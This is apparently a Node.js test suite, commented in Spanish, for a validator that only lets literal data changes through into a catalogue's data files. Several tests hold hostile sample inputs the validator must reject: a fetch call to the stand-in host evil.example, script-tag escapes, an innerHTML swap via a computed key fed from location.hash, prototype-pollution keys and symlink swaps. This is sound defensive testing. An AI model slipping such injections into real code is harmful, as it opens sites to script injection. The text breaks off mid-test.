import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync, readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { compararArchivo, compararArchivoSeguro, verificarArchivoEnNuevo, leerHunksDeDiff, MAX_BYTES, PERMITIDOS } from './validar-parche-lib.mjs';

const D = 'src/data/data.js';
// Los tests «con el archivo real» leen una COPIA CONGELADA (fixtures/validar-parche/), nunca
// src/data/ en vivo: una edición normal de los datos no puede romper npm test (revisión final, I3).
const FIXTURE = (f) => join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'validar-parche', f);
const base = 'const X = [\n  mk(1, "A", "M"),\n];\nwindow.DB.forEach(a => a);\n';

// --- los 9 casos del brief original, adaptados a la firma nueva (ruta, base, nuevo) ---

test('una ficha nueva con literales pasa', () => {
  const nuevo = base.replace('];', '  mk(2, "Mendoza RM22-3000 Squad", "Mendoza", null, 10.5),\n];');
  assert.deepEqual(compararArchivo(D, base, nuevo), []);
});

test('una llamada que no es mk/mun/acc se rechaza', () => {
  const nuevo = base.replace('];', '  fetch("https://x.y"),\n];');
  assert.ok(compararArchivo(D, base, nuevo).length > 0);
});

test('un argumento que no es literal se rechaza', () => {
  const nuevo = base.replace('];', '  mk(2, window.name),\n];');
  assert.ok(compararArchivo(D, base, nuevo).length > 0);
});

test('template literal y escapes se rechazan', () => {
  for (const s of ['`x`', '"\\u003cscript"', '"a</script>"']) {
    const nuevo = base.replace('];', `  mk(2, ${s}),\n];`);
    assert.ok(compararArchivo(D, base, nuevo).length > 0, s);
  }
});

test('borrar una línea de código se rechaza', () => {
  const nuevo = base.replace('window.DB.forEach(a => a);\n', '');
  assert.ok(compararArchivo(D, base, nuevo).length > 0);
});

test('el mapa de existencias regenerado pasa', () => {
  const b = 'window.AMX_ARMAS_EXISTENCIAS = { 1: 9 };\n';
  const n = 'window.AMX_ARMAS_EXISTENCIAS = { 1: 9, 52: 6 };\n';
  assert.deepEqual(compararArchivo('src/data/data-precios.js', b, n), []);
});

test('ligas: solo enteros o null', () => {
  const r = '.claude/skills/conciliar-inventario/scripts/ligas-armas.json';
  assert.deepEqual(compararArchivo(r, '{}', '{"MODELO X": 52, "Y": null}'), []);
  assert.ok(compararArchivo(r, '{}', '{"MODELO X": "52"}').length > 0);
});

// El brief original probaba "archivos nuevos/renombrados/binarios/cambios de modo" vía
// leerDiff (ya no existe: el validador no lee diffs). Equivalentes con la firma nueva:
test('archivo fuera de la lista se rechaza', () => {
  assert.ok(compararArchivo('scripts/x.py', 'a', 'b').length > 0);
});
test('un archivo nuevo (sin base) se valida igual que cualquier otro — y rechaza código', () => {
  const nuevo = 'const X = [\n  fetch(1),\n];\n';
  assert.ok(compararArchivo(D, '', nuevo).length > 0);
});
test('un archivo binario (no parsea como JS) se rechaza', () => {
  const nuevo = Buffer.from([0, 1, 2, 0xff, 0xfe]).toString('latin1');
  assert.ok(compararArchivo(D, base, nuevo).length > 0);
});
// "cambios de modo"/symlink: ver verificarArchivoEnNuevo abajo (Paso directorios).

// leerDiff ya no existe (el validador no lee diffs); su cobertura ("se aísla solo lo que
// cambió") queda demostrada por los casos de abajo (hallazgo del parche real + V9b).

test('paréntesis de llamada pegados a algo que no es mk/mun/acc se rechazan (mordida del paso 5)', () => {
  // A diferencia de `fetch(...)`, aquí no hay ningún identificador fuera de lista — solo
  // paréntesis de llamada pegados a un literal.
  const nuevo = base.replace('];', '  mk(2, "a"()),\n];');
  assert.ok(compararArchivo(D, base, nuevo).length > 0);
});

test('CRLF en JSON no rompe la validación de ligas', () => {
  const r = '.claude/skills/conciliar-inventario/scripts/ligas-armas.json';
  const b = '{}\r\n';
  const n = '{"MODELO X": 52, "Y": null}\r\n';
  assert.deepEqual(compararArchivo(r, b, n), []);
});

// --- hallazgos del parche real del 07-oct (ronda anterior): solo cambia lo que de verdad
// cambió dentro de un renglón de historial escrito en una sola línea ---

test('un renglón de historial en una sola línea: solo lo nuevo se valida, lo viejo (un helper no-mk/mun/acc) no', () => {
  const ruta = 'src/data/data-municiones.js';
  const b = 'const H = {\n  2004: [_mh(1, 2), _mh(3, 4)],\n};\n';
  const n = 'const H = {\n  2004: [_mh(1, 2), _mh(3, 4), { manualId: "x", price: "y", date: "z", qty: 5 }],\n};\n';
  assert.deepEqual(compararArchivo(ruta, b, n), []);
});

test('solo cambia un número junto a un string ya existente con comilla escapada', () => {
  const ruta = 'src/data/data-municiones.js';
  const b = 'const F = [\n  mun(1, "Cartucho 0.38\\" Super", 10),\n];\n';
  const n = 'const F = [\n  mun(1, "Cartucho 0.38\\" Super", 12),\n];\n';
  assert.deepEqual(compararArchivo(ruta, b, n), []);
});

// --- Ronda de arreglo 1: vectores Critical de la revisión (ataques.mjs) ---

test('V2: una sola comilla insertada re-tokeniza el sufijo común en código (se rechaza)', () => {
  const b = 'const X = [\n  mk(1, "x", "a), fetch(1), //"),\n];\n';
  const n = 'const X = [\n  mk(1, "x", "a"), fetch(1), //"),\n];\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('V2a: plantar el string con "//" y paréntesis de llamada ya se rechaza (antes de que lo reabran)', () => {
  const b = 'const X = [\n];\n';
  const n = 'const X = [\n  mk(1, "x", "a), fetch(1), //"),\n];\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('V6: una línea añadida que empieza con "++" ya no se lee como cabecera de diff (no se lee ningún diff)', () => {
  const b = 'const X = [\n  mk(1, "a"),\n];\n';
  const n = 'const X = [\n  mk(1, "a"),\n  ++window[fetch("https://evil.example")],\n];\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('un archivo PERMITIDO sustituido por un symlink en el nuevo se rechaza', () => {
  const dir = mkdtempSync(join(tmpdir(), 'dcam-test-'));
  try {
    const dirNuevo = join(dir, 'nuevo');
    mkdirSync(join(dirNuevo, dirname(D)), { recursive: true });
    const objetivo = join(dir, 'fuera-de-la-jaula.js');
    writeFileSync(objetivo, 'const X = [];\n');
    symlinkSync(objetivo, join(dirNuevo, D), 'file');
    const probs = verificarArchivoEnNuevo(dirNuevo, D);
    assert.ok(probs.length > 0, 'un symlink debe rechazarse aunque "parezca" el archivo correcto');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('un archivo PERMITIDO ausente en el nuevo se rechaza', () => {
  const dir = mkdtempSync(join(tmpdir(), 'dcam-test-'));
  try {
    const dirNuevo = join(dir, 'nuevo');
    mkdirSync(dirNuevo, { recursive: true }); // vacío: falta todo, incluido D
    const probs = verificarArchivoEnNuevo(dirNuevo, D);
    assert.ok(probs.length > 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('un archivo PERMITIDO que excede MAX_BYTES se rechaza', () => {
  const dir = mkdtempSync(join(tmpdir(), 'dcam-test-'));
  try {
    const dirNuevo = join(dir, 'nuevo');
    mkdirSync(join(dirNuevo, dirname(D)), { recursive: true });
    writeFileSync(join(dirNuevo, D), Buffer.alloc(MAX_BYTES + 1, 0x61));
    const probs = verificarArchivoEnNuevo(dirNuevo, D);
    assert.ok(probs.length > 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('un comentario añadido se rechaza (los comentarios no se tocan)', () => {
  const b = 'const X = [\n  mk(1, "a"),\n];\n';
  const n = 'const X = [\n  mk(1, "a"), // nota\n];\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('un comentario de bloque que reactiva código comentado se rechaza (V4)', () => {
  const b = 'const X = [\n/* ejemplo\nfetch("https://evil.example"),\n*/\n];\n';
  const n = 'const X = [\n/* ejemplo\n*/\nfetch("https://evil.example"),\n/*\n*/\n];\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('comentar código existente para desactivarlo se rechaza (V5)', () => {
  const b = 'const X = [\n];\nwindow.DB.forEach(a => a);\n';
  const n = 'const X = [\n];\n/*\nwindow.DB.forEach(a => a);\n*/\n';
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('CRLF en .js: una adición legítima sigue pasando y un ataque se sigue rechazando', () => {
  const b = 'const X = [\r\n  mk(1, "A", "M"),\r\n];\r\n';
  const bien = b.replace('];', '  mk(2, "B", "M"),\r\n];');
  assert.deepEqual(compararArchivo(D, b, bien), []);
  const mal = b.replace('];', '  fetch(1),\r\n];');
  assert.ok(compararArchivo(D, b, mal).length > 0);
});

test('mapeo: un string donde va un número entero (existencias) se rechaza', () => {
  const r = 'mapeo-armas.json';
  const base = JSON.stringify({ existencias: { 1: 9 }, precios: { 1: 10.5 }, factores: [1.0, 1.0], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 1, totalMapped: 1, excluidos: [], regresos: [], regresosRechazados: [] });
  const malo = JSON.stringify({ existencias: { 1: '9' }, precios: { 1: 10.5 }, factores: [1.0, 1.0], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 1, totalMapped: 1, excluidos: [], regresos: [], regresosRechazados: [] });
  assert.deepEqual(compararArchivo(r, base, base), []);
  assert.ok(compararArchivo(r, base, malo).length > 0);
});

test('mapeo: claves fuera de esquema o faltantes se rechazan', () => {
  const r = 'mapeo-armas.json';
  const base = JSON.stringify({ existencias: {}, precios: {}, factores: [], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 0, totalMapped: 0, excluidos: [], regresos: [], regresosRechazados: [] });
  const conExtra = JSON.stringify({ ...JSON.parse(base), __proto__eval: 'x' });
  const sinClave = JSON.stringify((() => { const o = JSON.parse(base); delete o.totalPdf; return o; })());
  assert.ok(compararArchivo(r, '{}', conExtra).length > 0);
  assert.ok(compararArchivo(r, '{}', sinClave).length > 0);
});

// --- Ronda de arreglo 2: esqueleto AST, callees por archivo, git en cerrado, esquema JSON ---

test('esqueleto: insertar solo puntuación permitida que re-estructura una función existente se rechaza', () => {
  // Ninguno de los tokens insertados (un "}" de más y el ";" que ya estaba) es "peligroso"
  // por sí solo — son justo los que el diff de tokens siempre deja pasar sin revisar su
  // contenido. Mueve el final de la función de lugar: lo que antes corría DENTRO de f ahora
  // corre fuera. El archivo sigue parseando.
  const b = 'function f(a) {\n  mk(1, "a");\n  mk(2, "b");\n}\n';
  const n = 'function f(a) {\n  mk(1, "a");\n}\nmk(2, "b");\n';
  const probs = compararArchivo(D, b, n);
  assert.ok(probs.length > 0, 'debe rechazar: la estructura cambió sin ningún token peligroso');
  assert.match(probs[0], /estructura/);
});

test('esqueleto: cambiar el string literal de una llamada de código existente se rechaza', () => {
  const b = 'const X = [\n  mk(1, "A", "M"),\n];\nwindow.DB.forEach(a => { a.x = "ok"; });\n';
  const n = b.replace('"ok"', '"no"');
  const probs = compararArchivo(D, b, n);
  assert.ok(probs.length > 0, 'un literal en posición de código debe quedar fijo en el esqueleto');
});

test('esqueleto: añadir ficha, registro de historial o número de mapa sigue pasando', () => {
  const b1 = 'const X = [\n  mk(1, "A", "M"),\n];\nwindow.DB.forEach(a => { a.x = "ok"; });\n';
  const n1 = b1.replace('];', '  mk(2, "B", "M"),\n];');
  assert.deepEqual(compararArchivo(D, b1, n1), []);

  const b2 = 'const H = {\n  2004: [_mh(1, 2)],\n};\n';
  const n2 = 'const H = {\n  2004: [_mh(1, 2), _mh(3, 4)],\n};\n';
  assert.deepEqual(compararArchivo('src/data/data-municiones.js', b2, n2), []);

  const b3 = 'window.AMX_ARMAS_EXISTENCIAS = { 1: 9 };\n';
  const n3 = 'window.AMX_ARMAS_EXISTENCIAS = { 1: 9, 52: 6 };\n';
  assert.deepEqual(compararArchivo('src/data/data-precios.js', b3, n3), []);
});

test('callees por archivo: un helper de data-municiones.js no es válido en data.js', () => {
  // Minor de la revisión: antes `_mh` quedaba permitido en los 4 .js aunque solo existe en
  // data-municiones.js. Mismo texto, ruta distinta: en data.js debe rechazarse.
  const b = 'const X = [\n  mk(1, "a"),\n];\n';
  const n = b.replace('];', '  _mh(1, 2),\n];');
  assert.ok(compararArchivo(D, b, n).length > 0);
  // y en su archivo sí es válido:
  const bM = 'const H = [\n  _mh(1, 2),\n];\n';
  const nM = bM.replace('];', '  _mh(3, 4),\n];');
  assert.deepEqual(compararArchivo('src/data/data-municiones.js', bM, nM), []);
});

test('leerHunksDeDiff: una salida "Binary files … differ" (sin ningún hunk) se detecta como tal', () => {
  // Decisión C: simula la salida en vez de depender de que git produzca ese caso (los
  // temporales que escribe este script nunca deberían parecer binarios, pero si algo en el
  // entorno los marca así —p. ej. un .gitattributes global que no debería aplicar—, esto es
  // lo que distingue ese caso de un diff normal: ningún "@@").
  const salida = 'diff --git a/base.tok b/nuevo.tok\nBinary files a/base.tok and b/nuevo.tok differ\n';
  const { añadidos, borrados, huboHunk } = leerHunksDeDiff(salida);
  assert.equal(huboHunk, false);
  assert.deepEqual(añadidos, []);
  assert.deepEqual(borrados, []);
});

test('leerHunksDeDiff: una salida normal con un hunk sí se detecta', () => {
  const salida = '@@ -2,1 +2,2 @@\nstring\t"x"\nname\t"y"\n';
  const { huboHunk } = leerHunksDeDiff(salida);
  assert.equal(huboHunk, true);
});

test('mapeo: una clave extra en un objeto de sinFicha se rechaza', () => {
  const r = 'mapeo-armas.json';
  const base = { existencias: {}, precios: {}, factores: [], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 0, totalMapped: 0, excluidos: [], regresos: [], regresosRechazados: [] };
  const malo = { ...base, sinFicha: [{ idx: 1, name: 'X', priceN: 10, qty: 1, desc: '', extra: 'no debería estar aquí' }] };
  assert.ok(compararArchivo(r, '{}', JSON.stringify(malo)).length > 0);
});

test('mapeo: un null en existencias se rechaza (a diferencia de ligas, aquí no se permite)', () => {
  const r = 'mapeo-armas.json';
  const base = { existencias: { 1: 9 }, precios: { 1: 10 }, factores: [], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 0, totalMapped: 0, excluidos: [], regresos: [], regresosRechazados: [] };
  const malo = { ...base, existencias: { 1: null } };
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify(base)), []);
  assert.ok(compararArchivo(r, '{}', JSON.stringify(malo)).length > 0);
});

test('mapeo: una clave "abc" en precios (no ^\\d+$) se rechaza', () => {
  const r = 'mapeo-armas.json';
  const base = { existencias: { 1: 9 }, precios: { 1: 10 }, factores: [], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 0, totalMapped: 0, excluidos: [], regresos: [], regresosRechazados: [] };
  const malo = { ...base, precios: { abc: 10 } };
  assert.ok(compararArchivo(r, '{}', JSON.stringify(malo)).length > 0);
});

test('referencia: una fila con un campo extra o un tipo equivocado se rechaza', () => {
  const r = '.claude/skills/conciliar-inventario/scripts/referencia-armas.json';
  const base = { pdfDate: '2026-10-13', pdfFile: 'armas', totalRows: 1, rows: [{ idx: 1, name: 'X', desc: '', priceN: 10, qty: 1, fichaId: null }] };
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify(base)), []);
  const conExtra = { ...base, rows: [{ ...base.rows[0], extra: 1 }] };
  assert.ok(compararArchivo(r, '{}', JSON.stringify(conExtra)).length > 0);
  const tipoMalo = { ...base, rows: [{ ...base.rows[0], fichaId: '52' }] };
  assert.ok(compararArchivo(r, '{}', JSON.stringify(tipoMalo)).length > 0);
});

// --- Ronda de arreglo 3: clave computada no serializada, callees de accesorios, etc. ---

test('esqueleto: clave computada en la copia congelada de accesorios se rechaza (4a de la re-revisión)', () => {
  const ACC = 'src/data/data-accesorios.js';
  const real = readFileSync(FIXTURE('data-accesorios.js'), 'utf8');
  const objetivo = '({ manualId: mid,';
  assert.ok(real.includes(objetivo), 'el patrón real de _h cambió; ajustar el test');
  const nuevo = real.replace(objetivo, '({ [manualId]: mid,');
  assert.ok(compararArchivo(ACC, real, nuevo).length > 0);
});

test('esqueleto: clave computada sintética { textContent: v } -> { [textContent]: v } se rechaza (4c)', () => {
  const b = 'const textContent = "innerHTML";\nconst v = location.hash;\nObject.assign(document.body, { textContent: v });\n';
  const n = b.replace('{ textContent: v }', '{ [textContent]: v }');
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('esqueleto: una directiva cambiada ("use strict" -> "use strixt") se rechaza (4f)', () => {
  const b = '"use strict";\nwindow.X = [mk(1, "a", "M")];\n';
  const n = b.replace('"use strict"', '"use strixt"');
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('marcador D lleva el tipo de nodo: un array de datos no es intercambiable con una llamada o un objeto (Minor #2)', () => {
  const b1 = 'window.X = [1, 2];\nwindow.X.forEach(f);\n';
  const n1 = b1.replace('[1, 2]', 'mk(1, 2)');
  assert.ok(compararArchivo(D, b1, n1).length > 0);

  const b2 = 'window.X = [1, 2];\nfor (let i = 0; i < window.X.length; i++) g(window.X[i]);\n';
  const n2 = b2.replace('[1, 2]', '{ length: 9 }');
  assert.ok(compararArchivo(D, b2, n2).length > 0);
});

test('callees: amx es el constructor de ficha de data-accesorios.js (Important #3, antes faltaba)', () => {
  const ACC = 'src/data/data-accesorios.js';
  const real = readFileSync(FIXTURE('data-accesorios.js'), 'utf8');
  // Añadir una ficha nueva con literales debe pasar.
  const objetivoAlta = "  amx(102, ";
  assert.ok(real.includes(objetivoAlta), 'el patrón real de amx cambió; ajustar el test');
  const conAlta = real.replace(objetivoAlta, "  amx(9999, 'Nuevo', 'M', 'EUA', 'cargadores', 'dcam', 1.5, null, {}, {}, 'x'),\n  amx(102, ");
  assert.deepEqual(compararArchivo(ACC, real, conAlta), []);
  // Cambiar el precio de una ficha amx existente debe pasar.
  const objetivoPrecio = "'cargadores', 'dcam', 590.63,";
  assert.ok(real.includes(objetivoPrecio), 'el precio real cambió; ajustar el test');
  const conPrecio = real.replace(objetivoPrecio, "'cargadores', 'dcam', 600.01,");
  assert.deepEqual(compararArchivo(ACC, real, conPrecio), []);
});

test('constantesLiterales exige `const` — un `let` nunca cuenta como dato puro (Minor #4)', () => {
  const b = "let K = 'x';\nK = location.hash;\nwindow.R = [K, 1];\n";
  const n = b.replace('[K, 1]', '[K, 2]');
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('constantesLiterales ignora un nombre que se sombrea como parámetro en otro lado del archivo', () => {
  const b = "const S25 = 'x';\nfunction f(S25) { return [S25, 1]; }\nwindow.R = f(location.hash);\n";
  const n = b.replace('[S25, 1]', '[S25, 2]');
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('datos puros: una clave __proto__/constructor/prototype se rechaza aunque el valor sea literal (endurecimiento #6)', () => {
  const b = 'const X = [\n  mk(1, "a"),\n];\n';
  const n = b.replace('];', '  mk(2, { "__proto__": { "x": 1 } }),\n];');
  assert.ok(compararArchivo(D, b, n).length > 0);
});

test('compararArchivoSeguro convierte cualquier excepción (p. ej. git ausente) en un problema, nunca una traza (Minor #5)', () => {
  const b = 'const X = [\n  mk(1, "A", "M"),\n];\n';
  const n = b.replace('];', '  mk(2, "B", "M"),\n];');
  const pathOriginal = process.env.PATH;
  try {
    // Sin git en PATH, diferenciaDeTokens debe fallar con una excepción real (no "sin
    // diferencias"); compararArchivoSeguro debe atraparla y devolver un problema, no tronar.
    process.env.PATH = '';
    const probs = compararArchivoSeguro(D, b, n);
    assert.ok(probs.length > 0);
    assert.match(probs[0], /no se pudo validar/);
  } finally {
    process.env.PATH = pathOriginal;
  }
});

// --- Fase 1b, hueco #1: `\$` vuelve impura una ficha legítima (data.js real, mk(128)) ---

test('Fase 1b #1: con la copia congelada de data.js, añadir una ficha nueva al final de window.DB con literales pasa', () => {
  // Antes del fix, mk(128) (que contiene \$ en su descripción larga) hacía que window.DB
  // entero no fuera "dato puro" y por lo tanto nunca colapsara a un marcador D fijo en el
  // esqueleto — así que CUALQUIER ficha añadida cambiaba el esqueleto serializado completo
  // ("la estructura del código cambió"), sin importar qué tan literal fuera lo añadido.
  const real = readFileSync(FIXTURE('data.js'), 'utf8');
  const marcaInicio = real.indexOf('window.DB = [');
  assert.ok(marcaInicio >= 0, 'window.DB = [ no está donde se esperaba; ajustar el test');
  // El archivo real usa CRLF; buscar el cierre del array sin asumir el fin de línea exacto.
  const finArrayMatch = /\r?\n\];\r?\n/.exec(real.slice(marcaInicio));
  assert.ok(finArrayMatch, 'cierre de window.DB no encontrado; ajustar el test');
  const finArray = marcaInicio + finArrayMatch.index;
  // No asumir CRLF: usar el mismo fin de línea que el cierre encontrado (ronda de arreglo
  // 1/5, Minor: antes estaba fijo a '\r\n').
  const eol = finArrayMatch[0].startsWith('\r') ? '\r\n' : '\n';
  const nuevaFicha = `${eol}  mk(999, "Arma de prueba", "Fabricante de prueba", "pistola", "México", "9mm Parabellum", "10+1", "1 kg", "100 mm", "Semi-auto", 2026, "dcam", "FICHA DE PRUEBA", "imagenes/arma-prueba.webp", "Ficha sintética para el test del validador; no es un arma real."),`;
  const nuevo = real.slice(0, finArray) + nuevaFicha + real.slice(finArray);
  assert.deepEqual(compararArchivo(D, real, nuevo), []);
});

test('Fase 1b #1: con la copia congelada de data.js, cambiar el año de mk(128) pasa', () => {
  const real = readFileSync(FIXTURE('data.js'), 'utf8');
  const objetivo = 'gatillo de dos etapas", 2023,';
  assert.ok(real.includes(objetivo), 'el patrón real de mk(128) cambió; ajustar el test');
  const nuevo = real.replace(objetivo, 'gatillo de dos etapas", 2024,');
  assert.deepEqual(compararArchivo(D, real, nuevo), []);
});

test('Fase 1b #1: \\$ es dato legítimo (mismo trato que \\" y \\\'), pero \\u0024 y \\x24 (mismo carácter, otro escape) siguen rechazados', () => {
  const pasa = base.replace('];', '  mk(2, "a\\$"),\n];');
  assert.deepEqual(compararArchivo(D, base, pasa), []);
  // Ningún OTRO escape nuevo: solo se tocó la regla para \$, no para otras formas de producir
  // el mismo carácter ($).
  for (const s of ['"\\u0024"', '"\\x24"']) {
    const nuevo = base.replace('];', `  mk(2, ${s}),\n];`);
    assert.ok(compararArchivo(D, base, nuevo).length > 0, s);
  }
});

test('Fase 1b (ronda 1) #2: una barra SUELTA delante de $ sigue rechazada (2 y 3 backslashes reales, y mezclada con otro escape malo)', () => {
  // El regex (/\\(['"$])/g) solo consume UN par barra+carácter por cada "$"/comilla,
  // empezando por el que está pegado al "$" — cualquier backslash EXTRA antes de ese par
  // queda sin consumir y cae en el /\\/.test de abajo. Se construye con .repeat() (no a
  // ojo) para que el número de backslashes REALES en el crudo del subject quede inequívoco.
  const dosBarras = '"a' + '\\'.repeat(2) + '$"'; // crudo del subject: a \\ $ (escapa un backslash real, luego "$" suelto)
  const tresBarras = '"' + '\\'.repeat(3) + '$"'; // crudo del subject: \\\ $ (dos backslashes reales sobran)
  for (const s of [dosBarras, tresBarras]) {
    const nuevo = base.replace('];', `  mk(2, ${s}),\n];`);
    assert.ok(compararArchivo(D, base, nuevo).length > 0, JSON.stringify(s));
  }
  // Un \$ legítimo en el MISMO string que un < ilegítimo: el \$ se descarta bien, pero
  // el backslash de < sigue sin consumir -> se rechaza igual (el fix no exime al resto
  // del string de las demás reglas).
  const mezclado = '"' + '\\' + '$' + '\\' + 'u003c"';
  const nuevoMezclado = base.replace('];', `  mk(2, ${mezclado}),\n];`);
  assert.ok(compararArchivo(D, base, nuevoMezclado).length > 0, mezclado);
});

// --- Fase 1b, ronda de arreglo 1/5: el guard del CLI se elimina (Critical: fallaba en
// abierto por symlink/junction) — el CLI ya no se auto-identifica, siempre corre ---

test('Fase 1b (ronda 1) #1 Critical: el CLI corre y detecta el ataque aunque se invoque por symlink o junction', () => {
  // No se usa el script real del repo como DESTINO del enlace: se copian los dos archivos a
  // un directorio desechable, y el symlink/junction apunta ahí. Así, si algo sale mal al
  // limpiar un enlace de directorio (junction) con rmSync recursivo, lo peor que puede pasar
  // es borrar la copia desechable — nunca el repo real.
  // Tiene que vivir DENTRO del repo (no en os.tmpdir()): `validar-parche-lib.mjs` importa
  // `@babel/parser`/`@babel/types` como paquetes, y Node busca `node_modules` subiendo desde
  // la ruta REAL del archivo que se ejecuta (la del symlink, no la del enlace) — fuera del
  // árbol del repo no hay ningún `node_modules` que encontrar.
  const dirEnlaces = mkdtempSync(join(process.cwd(), 'scripts', 'dcam', '.tmp-enlace-'));
  const dirReal = join(dirEnlaces, 'real');
  let enlace;
  try {
    mkdirSync(dirReal, { recursive: true });
    writeFileSync(join(dirReal, 'validar-parche.mjs'), readFileSync(join(process.cwd(), 'scripts', 'dcam', 'validar-parche.mjs')));
    writeFileSync(join(dirReal, 'validar-parche-lib.mjs'), readFileSync(join(process.cwd(), 'scripts', 'dcam', 'validar-parche-lib.mjs')));

    const symlinkArchivo = join(dirEnlaces, 'enlace-validar-parche.mjs');
    try {
      symlinkSync(join(dirReal, 'validar-parche.mjs'), symlinkArchivo, 'file');
      enlace = symlinkArchivo;
    } catch {
      // Sin privilegio para symlink de ARCHIVO (típico en Windows sin modo desarrollador):
      // junction al directorio completo, y se invoca el script a través de ella.
      const junctionDir = join(dirEnlaces, 'junction-dir');
      symlinkSync(dirReal, junctionDir, 'junction');
      enlace = join(junctionDir, 'validar-parche.mjs');
    }

    const dirBase = mkdtempSync(join(tmpdir(), 'dcam-cli-base-'));
    const dirNuevo = mkdtempSync(join(tmpdir(), 'dcam-cli-nuevo-'));
    try {
      // Los otros 12 archivos PERMITIDOS: idénticos (vacíos) en base y nuevo -> se saltan sin
      // validar, para que el único problema real sea el ataque de abajo.
      for (const ruta of PERMITIDOS) {
        if (ruta === D) continue;
        mkdirSync(join(dirNuevo, dirname(ruta)), { recursive: true });
        writeFileSync(join(dirNuevo, ruta), '');
      }
      const contenidoLimpio = 'const X = [\n  mk(1, "a"),\n];\n';
      mkdirSync(join(dirBase, dirname(D)), { recursive: true });
      writeFileSync(join(dirBase, D), contenidoLimpio);
      mkdirSync(join(dirNuevo, dirname(D)), { recursive: true });
      writeFileSync(join(dirNuevo, D), contenidoLimpio);

      // Control positivo PRIMERO (mismos 13 archivos, data.js todavía sin ataque): el enlace
      // tiene que dar "✔ solo datos" con status 0. Sin este control, un status != 0 contra el
      // ataque de abajo podría ser un crash cualquiera (p. ej. MODULE_NOT_FOUND de
      // @babel/parser) en vez de la detección real — ambos casos dan "status != 0 y sin ✔
      // solo datos" por igual.
      const rLimpio = spawnSync(process.execPath, [enlace, dirBase, dirNuevo], { encoding: 'utf8' });
      assert.equal(rLimpio.status, 0, `status=${rLimpio.status} stdout=${rLimpio.stdout} stderr=${rLimpio.stderr}`);
      assert.match(rLimpio.stdout, /✔ solo datos/, `stdout=${rLimpio.stdout}`);

      writeFileSync(join(dirNuevo, D), 'const X = [\n  mk(1, "a"),\n  fetch(1),\n];\n');
      const r = spawnSync(process.execPath, [enlace, dirBase, dirNuevo], { encoding: 'utf8' });
      assert.notEqual(r.status, 0, `status=${r.status} stdout=${r.stdout} stderr=${r.stderr}`);
      assert.ok(!r.stdout.includes('✔ solo datos'), `stdout=${r.stdout}`);
      // No se exige un mensaje concreto (fetch(1) agregado a un array dispara la capa de
      // esqueleto, "la estructura del código cambió", no la de tokens) — solo que señale el
      // archivo real y no una traza de otra cosa (p. ej. MODULE_NOT_FOUND).
      assert.match(r.stderr, /data\.js/, `debe señalar data.js, no tronar por otra razón: stderr=${r.stderr}`);
    } finally {
      rmSync(dirBase, { recursive: true, force: true });
      rmSync(dirNuevo, { recursive: true, force: true });
    }
  } finally {
    rmSync(dirEnlaces, { recursive: true, force: true });
  }
});

test('Fase 1b (ronda 1) #3: el CLI sin exactamente 2 argumentos sale con status 2 (uso)', () => {
  const scriptReal = join(process.cwd(), 'scripts', 'dcam', 'validar-parche.mjs');
  const sinArgs = spawnSync(process.execPath, [scriptReal], { encoding: 'utf8' });
  assert.equal(sinArgs.status, 2, `status=${sinArgs.status} stdout=${sinArgs.stdout} stderr=${sinArgs.stderr}`);
  const unArgDeMas = spawnSync(process.execPath, [scriptReal, 'a', 'b', 'c'], { encoding: 'utf8' });
  assert.equal(unArgDeMas.status, 2, `status=${unArgDeMas.status} stdout=${unArgDeMas.stdout} stderr=${unArgDeMas.stderr}`);
});

// --- Fase 3c: mapeador de #375 (gemelos y regresos renombrados) ---
const MAPEO_VACIO = { existencias: {}, precios: {}, factores: [], sinFicha: [], sinPrecio: [], revisarPrecio: [], totalPdf: 0, totalMapped: 0, excluidos: [], regresos: [], regresosRechazados: [] };

test('mapeo (#375): gemelos válido pasa, y un mapeo sin gemelos (anterior a #375) también', () => {
  const r = 'mapeo-armas.json';
  const con = { ...MAPEO_VACIO, gemelos: [{ idx: 12, name: 'RIFLE CAL22 X', qty: 0, fichaId: 81 }, { idx: 13, name: 'RIFLE CAL22 X', qty: 2, fichaId: 81 }] };
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify(con)), []);
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify({ ...MAPEO_VACIO, gemelos: [] })), []);
  assert.deepEqual(compararArchivo(r, '{}', JSON.stringify(MAPEO_VACIO)), []);
});

test('mapeo (#375): gemelos con una clave extra o un tipo malo se rechaza', () => {
  const r = 'mapeo-armas.json';
  const g = { idx: 12, name: 'RIFLE CAL22 X', qty: 1, fichaId: 81 };
  for (const malo of [
    { ...g, extra: 1 },
    { ...g, fichaId: '81' },
    { ...g, qty: -1 },
    { ...g, idx: 1.5 },
    { ...g, name: 'a\u0000b' },
    { idx: 12, name: 'X', qty: 1 },
  ]) {
    assert.ok(compararArchivo(r, '{}', JSON.stringify({ ...MAPEO_VACIO, gemelos: [malo] })).length > 0, JSON.stringify(malo));
  }
  assert.ok(compararArchivo(r, '{}', JSON.stringify({ ...MAPEO_VACIO, gemelos: {} })).length > 0);
});

test('mapeo (#375): los rechazos y regresos «renombre» caben aunque el dcamRef sea el más largo real (120)', () => {
  const r = 'mapeo-armas.json';
